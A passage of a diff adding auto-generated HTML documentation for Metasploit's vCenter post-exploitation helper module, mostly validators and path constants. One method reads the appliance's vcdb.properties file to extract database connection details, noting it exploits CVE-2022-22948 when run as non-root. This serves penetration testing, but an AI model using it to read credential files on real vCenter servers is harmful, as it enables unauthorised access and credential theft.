+  <span class='kw'>return</span> <span class='kw'>true</span> <span class='kw'>if</span> <span class='id identifier rubyid_dn'>dn</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^(?:(?&lt;cn&gt;cn=(?&lt;name&gt;[^,]*)),)?(?:(?&lt;path&gt;(?:(?:cn|ou)=[^,]+,?)+),)?(?&lt;domain&gt;(?:dc=[^,]+,?)+)$</span><span class='regexp_end'>/</span></span>
+
+  <span class='kw'>false</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="is_fqdn?-instance_method">
+  
+    #<strong>is_fqdn?</strong>(fqdn)  &#x21d2; <tt>Bool</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Function to determine if a string is a valid FQDN or not</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the string to check if it is a valid FQDN or not</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Bool</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>boolean if the string is a valid FQDN</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+59
+60
+61
+62
+63</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 59</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_is_fqdn?'>is_fqdn?</span><span class='lparen'>(</span><span class='id identifier rubyid_fqdn'>fqdn</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>true</span> <span class='kw'>if</span> <span class='id identifier rubyid_fqdn'>fqdn</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>(?=^.{4,253}$)(^((?!-)[a-z0-9-]{0,62}[a-z0-9]\.)+[a-z]{2,63}$)</span><span class='regexp_end'>/</span></span>
+
+  <span class='kw'>false</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="is_uuid?-instance_method">
+  
+    #<strong>is_uuid?</strong>(uuid)  &#x21d2; <tt>Bool</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Function to determine if a string is a valid UUID or not</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>uuid</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the string to check if it is a valid UUID or not</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Bool</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>boolean if the string is a UUID</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+70
+71
+72
+73
+74</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 70</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_is_uuid?'>is_uuid?</span><span class='lparen'>(</span><span class='id identifier rubyid_uuid'>uuid</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>true</span> <span class='kw'>if</span> <span class='id identifier rubyid_uuid'>uuid</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$</span><span class='regexp_end'>/</span></span>
+
+  <span class='kw'>false</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="ldapsearch_bin-instance_method">
+  
+    #<strong>ldapsearch_bin</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+38
+39
+40</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 38</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_ldapsearch_bin'>ldapsearch_bin</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/opt/likewise/bin/ldapsearch</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="lwregshell_bin-instance_method">
+  
+    #<strong>lwregshell_bin</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+30
+31
+32</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 30</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_lwregshell_bin'>lwregshell_bin</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/opt/likewise/bin/lwregshell</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="manifest_file-instance_method">
+  
+    #<strong>manifest_file</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+10
+11
+12</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 10</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_manifest_file'>manifest_file</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/opt/vmware/etc/appliance-manifest.xml</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="photon_version_file-instance_method">
+  
+    #<strong>photon_version_file</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+22
+23
+24</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 22</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_photon_version_file'>photon_version_file</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/photon-release</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="process_vcdb_properties_file-instance_method">
+  
+    #<strong>process_vcdb_properties_file</strong>(location = vcd_properties_file)  &#x21d2; <tt>Hash</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns a hash table of the vcdb.properties file</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>location</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>vcd_properties_file</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>where the file is located. defaults to /etc/vmware-vpx/vcdb.properties</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Hash</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>hash of the file contents, nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+363
+364
+365
+366
+367
+368
+369
+370
+371
+372
+373
+374
+375
+376
+377
+378
+379
+380
+381
+382
+383
+384
+385
+386
+387
+388
+389
+390
+391
+392
+393
+394
+395</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 363</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_process_vcdb_properties_file'>process_vcdb_properties_file</span><span class='lparen'>(</span><span class='id identifier rubyid_location'>location</span> <span class='op'>=</span> <span class='id identifier rubyid_vcd_properties_file'>vcd_properties_file</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_location'>location</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_contents'>contents</span> <span class='op'>=</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_location'>location</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>if</span> <span class='id identifier rubyid_contents'>contents</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_location'>location</span> <span class='op'>==</span> <span class='id identifier rubyid_vcd_properties_file'>vcd_properties_file</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_is_root?'>is_root?</span> <span class='op'>==</span> <span class='kw'>false</span>
+    <span class='id identifier rubyid_print_good'>print_good</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Exploited CVE-2022-22948 to read #{vcd_properties_file}</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span>
+  <span class='id identifier rubyid_contents'>contents</span><span class='period'>.</span><span class='id identifier rubyid_each_line'>each_line</span><span class='lparen'>(</span><span class='label'>chomp:</span> <span class='kw'>true</span><span class='rparen'>)</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_line'>line</span><span class='op'>|</span>
+    <span class='kw'>next</span> <span class='kw'>unless</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>=</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='comment'># attempt to do a little quality control
+</span>
+    <span class='id identifier rubyid_line'>line</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>=</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_shift'>shift</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+    <span class='id identifier rubyid_value'>value</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>=</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+    <span class='id identifier rubyid_output'>output</span><span class='lbracket'>[</span><span class='id identifier rubyid_key'>key</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_value'>value</span>
+    <span class='kw'>next</span> <span class='kw'>unless</span> <span class='id identifier rubyid_key'>key</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>url</span><span class='tstring_end'>&#39;</span></span>
+
+    <span class='comment'># url is a compound object with database type, host, port, and name.
+</span>    <span class='comment'># we&#39;ll split that into its own as well to make them easy to reference
+</span>    <span class='comment'># example line -&gt; &#39;jdbc:postgresql://localhost:5432/VCDB&#39;
+</span>    <span class='id identifier rubyid_value'>value</span> <span class='op'>=</span> <span class='id identifier rubyid_value'>value</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>://</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_output'>output</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>db_engine</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_value'>value</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>:</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_output'>output</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>host</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_value'>value</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>:</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_output'>output</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>port</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_value'>value</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>:</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>
+  <span class='kw'>end</span>
+  <span class='comment'># pull out the name from the url
+</span>  <span class='kw'>unless</span> <span class='id identifier rubyid_output'>output</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>url</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+    <span class='id identifier rubyid_output'>output</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>name</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_output'>output</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>url</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_last'>last</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_output'>output</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="psql_bin-instance_method">
+  
+    #<strong>psql_bin</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+46
+47
+48</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 46</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_psql_bin'>psql_bin</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/opt/vmware/vpostgres/current/bin/psql</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="validate_pkey-instance_method">
+  
+    #<strong>validate_pkey</strong>(private_key)  &#x21d2; <tt>OpenSSL::PKey::RSA</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Function to validate an x509 private key</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>cert</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the string to determine if its a valid x509 private key</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>OpenSSL::PKey::RSA</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>or nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 108</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_validate_pkey'>validate_pkey</span><span class='lparen'>(</span><span class='id identifier rubyid_private_key'>private_key</span><span class='rparen'>)</span>
+  <span class='comment'># the gsub is specific to vcenter ldapsearch returning spaces after a new line, but shouldn&#39;t
+</span>  <span class='comment'># effect normal keys read from files
+</span>  <span class='lbracket'>[</span><span class='id identifier rubyid_private_key'>private_key</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-----BEGIN PRIVATE KEY-----\n</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_private_key'>private_key</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n-----END PRIVATE KEY-----</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n </span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_private_key'>private_key</span><span class='op'>|</span>
+    <span class='kw'>return</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>PKey</span><span class='op'>::</span><span class='const'>RSA</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_private_key'>private_key</span><span class='rparen'>)</span>
+  <span class='kw'>rescue</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>PKey</span><span class='op'>::</span><span class='const'>PKeyError</span>
+    <span class='kw'>nil</span>
+  <span class='kw'>end</span>
+  <span class='kw'>nil</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="validate_x509_cert-instance_method">
+  
+    #<strong>validate_x509_cert</strong>(cert)  &#x21d2; <tt>OpenSSL::X509::Certificate</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Function to validate an x509 certificate. Validates with or without certificate header line</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>cert</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the string to determine if its a valid x509 certificate</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>OpenSSL::X509::Certificate</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>or nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 92</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_validate_x509_cert'>validate_x509_cert</span><span class='lparen'>(</span><span class='id identifier rubyid_cert'>cert</span><span class='rparen'>)</span>
+  <span class='comment'># the gsub is specific to vcenter ldapsearch returning spaces after a new line, but shouldn&#39;t
+</span>  <span class='comment'># effect normal certs read from files
+</span>  <span class='lbracket'>[</span><span class='id identifier rubyid_cert'>cert</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-----BEGIN CERTIFICATE-----\n</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n-----END CERTIFICATE-----</span><span class='tstring_end'>&quot;</span></span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n </span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_cert'>cert</span><span class='op'>|</span>
+    <span class='kw'>return</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>X509</span><span class='op'>::</span><span class='const'>Certificate</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_cert'>cert</span><span class='rparen'>)</span>
+  <span class='kw'>rescue</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>X509</span><span class='op'>::</span><span class='const'>CertificateError</span>
+    <span class='kw'>nil</span>
+  <span class='kw'>end</span>
+  <span class='kw'>nil</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="vcd_properties_file-instance_method">
+  
+    #<strong>vcd_properties_file</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+50
+51
+52</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 50</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_vcd_properties_file'>vcd_properties_file</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/vmware-vpx/vcdb.properties</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="vecs_bin-instance_method">
+  
+    #<strong>vecs_bin</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+42
+43
+44</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 42</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_vecs_bin'>vecs_bin</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/usr/lib/vmware-vmafd/bin/vecs-cli</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="vmafd_bin-instance_method">
+  
+    #<strong>vmafd_bin</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+26
+27
+28</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 26</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_vmafd_bin'>vmafd_bin</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/usr/lib/vmware-vmafd/bin/vmafd-cli</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="vpxd_bin-instance_method">
+  
+    #<strong>vpxd_bin</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+34
+35
+36</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 34</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_vpxd_bin'>vpxd_bin</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/usr/sbin/vpxd</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Thu Jan 29 04:40:05 2026 by
+  <a href="https://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.37 (ruby-3.1.5).
+</div>
+
+    </div>
+  </body>
+</html>
